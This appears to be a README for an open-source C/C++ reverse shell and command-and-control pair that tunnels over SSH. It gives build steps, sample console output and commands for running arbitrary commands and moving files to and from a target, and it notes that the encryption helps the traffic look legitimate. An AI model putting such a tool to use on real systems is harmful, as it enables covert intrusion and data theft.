# ssh-tcp-reverse-shell-cpp

A TCP reverse shell implemented in C/C++ encrypted over a SSH tunnel. ```libssh``` is used for implementing SSH and SFTP.

# Prerequisites

* You need to have ```cmake``` installed on your machine.
* You need to have ```libssh``` installed on your machine.
* You need to have a ```rsa``` key on your system

# Build

* Figure out where your ```rsa``` key file resides on the computer you'll be running the c2 instance. Adjust the ```KEYS_FOLDER``` macro in the ```c2/C2Server.h``` file.
* Adjust the host/port in the source headers.
* Configure cmake like following
  ```
    $ cmake -DCMAKE_BUILD_TYPE=Debug -G "Unix Makefiles"
  ```
* Build the executables with make ```$ make```
* Execute the server and payload
  ```
  $ ./c2
  [+] Creating C2 server...
  [+] SSH server listening on 127.0.0.1:4433...
  ```
  ```
  $ ./payload
  [+] Setting up SSH connection...
  [+] Connecting to C2...
  [+] Authenticating...
  [+] Opening communication channel...
  ```
  
 # Functionality
 
 * Arbitrary command execute
 * File upload
 * File download
 * Encrypted communication over SSH
 
 # Details
 
 The payload calls home to the c2 server in an endless loop until it receives the "quit" command. The c2 requests a command from the user upon beacon from the payload. You can send any CLI arguments and upload/download arguments in the form of:
 
 ```
 CMD > upload <localFilePath> <remoteFilePath>
 ```
 ```
 CMD > download <remoteFilePath> <localFilePath>
 ```
 
 (localFilePath := on the target machine, remoteFilePath := on the c2 machine)
 
 The communication is encrypted over SSH which makes it secure and look more legit.
 
 # Outstanding improvements
 * Implement multi-user (multiple payloads) management
 * Implement change directory cmd
 * Implement binary files transfer (currently only text-ish files)
